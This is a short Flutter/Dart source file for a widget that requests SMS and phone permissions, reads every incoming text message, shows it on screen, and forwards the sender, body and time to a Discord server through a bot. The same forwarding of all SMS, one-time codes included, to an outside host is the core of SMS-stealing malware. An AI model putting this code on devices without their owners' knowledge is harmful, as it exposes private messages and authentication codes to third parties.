import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:readsms/readsms.dart';

import 'discord_bot.dart';

class SMSReader extends StatefulWidget {
  final DiscordBot bot;

  const SMSReader({required this.bot, super.key});

  @override
  SMSReaderState createState() => SMSReaderState();
}

class SMSReaderState extends State<SMSReader> {
  final _plugin = Readsms();
  String sms = 'no sms received';
  String sender = 'no sms received';
  String time = 'no sms received';

  @override
  void initState() {
    super.initState();
    requestPermissions();
    initSMSReading();
  }

  void requestPermissions() async {
    await Permission.sms.request();
    await Permission.phone.request();
  }

  void initSMSReading() {
    _plugin.read();
    _plugin.smsStream.listen((event) {
      setState(() {
        sms = event.body;
        sender = event.sender;
        time = event.timeReceived.toString();

        String discordMessage =
            'Received SMS from: $sender: $sms\nTime received: $time';
        widget.bot.sendMessageToServer(discordMessage);

        //print("sms received");
      });
    });
  }

  @override
  void dispose() {
    _plugin.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Column(
      mainAxisAlignment: MainAxisAlignment.center,
      children: [
        Text('new sms received: $sms'),
        Text('new sms sender: $sender'),
        Text('new sms time: $time'),
      ],
    );
  }
}
